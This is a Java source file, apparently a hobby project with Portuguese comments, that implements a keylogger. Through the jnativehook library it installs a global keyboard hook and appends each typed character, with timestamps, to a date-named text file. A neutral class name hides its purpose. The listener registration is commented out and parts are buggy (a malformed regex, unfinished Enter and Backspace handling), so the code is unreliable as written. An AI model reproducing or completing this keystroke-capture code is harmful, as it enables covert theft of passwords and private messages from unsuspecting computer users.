package testes;

//FEITO POR SPLAYER  :)

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import javax.swing.JOptionPane;
import org.jnativehook.GlobalScreen;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.jnativehook.mouse.NativeMouseEvent;
import org.jnativehook.mouse.NativeMouseListener;

public class ProgramaXYZ implements NativeKeyListener, NativeMouseListener {

    public static void main(String[] args) {
        try {
            GlobalScreen.registerNativeHook();
        } catch (Exception e) {
            JOptionPane.showMessageDialog(null, e.getMessage());
        }
       // GlobalScreen.getInstance().addNativeKeyListener(new ProgramaXYZ());
        //GlobalScreen.getInstance().addNativeMouseListener(new ProgramaXYZ());
    }

    boolean clicar;
    boolean teclar;

    Date data = new Date();
    SimpleDateFormat fd = new SimpleDateFormat("dd-MM-yyyy");
    String fdd = fd.format(data);
    Date hora = new Date();
    SimpleDateFormat fh = new SimpleDateFormat("[--HH:mm:ss--]");
    String fhh = fh.format(hora);

    File file = new File(fdd + ".txt");

    public void colocarHora() {
        try (BufferedWriter writer = new BufferedWriter(new FileWriter(new File(fdd + ".txt"), true))) {
            if (teclar == false) {
                writer.newLine();
                writer.write(fhh);
                writer.newLine();
                clicar = false;
                teclar = true;
            }
        } catch (IOException ex) {
            JOptionPane.showMessageDialog(null, ex.getMessage());
        }
    }

    public void nativeKeyPressed(NativeKeyEvent nke) {
        /*String dados = NativeKeyEvent.getKeyText(nke.getKeyCode());
        try (BufferedWriter writer = new BufferedWriter(new FileWriter(new File(fdd + ".txt"), true))) {
        colocarHora();
        if (nke.getKeyCode() == NativeKeyEvent.VC_BACKSPACE) {
        //dados = dados.substring (0, dados.length() - 1);
        //dados = dados.substring (2);
        } else if (nke.getKeyCode() == NativeKeyEvent.VC_ENTER) {
        writer.write("\n");
        } else if (nke.getKeyCode() == NativeKeyEvent.VC_CAPS_LOCK) {
        } else if (nke.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
        } else if (nke.getKeyCode() == NativeKeyEvent.VC_SPACE) {
        writer.write(" ");
        } else if (nke.getKeyCode() == NativeKeyEvent.VC_SCROLL_LOCK) {
        GlobalScreen.unregisterNativeHook();
        } else if (true) {
        writer.write(dados);
        writer.flush();
        }
        } catch (IOException ex) {
        JOptionPane.showMessageDialog(null, ex.getMessage());
        }*/
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nke) {
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nke) {
        String dados = String.valueOf(nke.getKeyChar());
        try (BufferedWriter writer = new BufferedWriter(new FileWriter(new File(fdd + ".txt"), true))) {
            colocarHora();
            if (nke.getKeyCode() == NativeKeyEvent.VC_ENTER) {
                // TODO: O Enter ainda não funciona, verificar.
                writer.newLine();
                writer.write("\n");
                writer.flush();
            } else if (nke.getKeyCode() == NativeKeyEvent.VC_SPACE) {
                writer.write(" ");
                writer.flush();
            } else if (nke.getKeyCode() == NativeKeyEvent.VC_BACKSPACE) {
                // TODO: Falta implementar apagar com o backspace.
            } else if (!dados.matches("/^[0-9a-zA-Z.,\b]+$/")) {
                writer.write(dados);
                writer.flush();
            }
            writer.close();
        } catch (IOException ex) {
            JOptionPane.showMessageDialog(null, ex.getMessage());
        }
    }

    public void nativeMouseClicked(NativeMouseEvent nme) {
        /*        try (BufferedWriter writer = new BufferedWriter(new FileWriter(new File(fdd + ".txt"), true))) {
        if (clicar == false) {
        writer.newLine();
        writer.write(fhh);
        writer.newLine();
        clicar = true;
        teclar = false;
        }
        } catch (IOException ex) {
        System.out.println(ex.getMessage());
        }*/
    }

    @Override
    public void nativeMousePressed(NativeMouseEvent nme) {
    }

    @Override
    public void nativeMouseReleased(NativeMouseEvent nme) {
    }

}
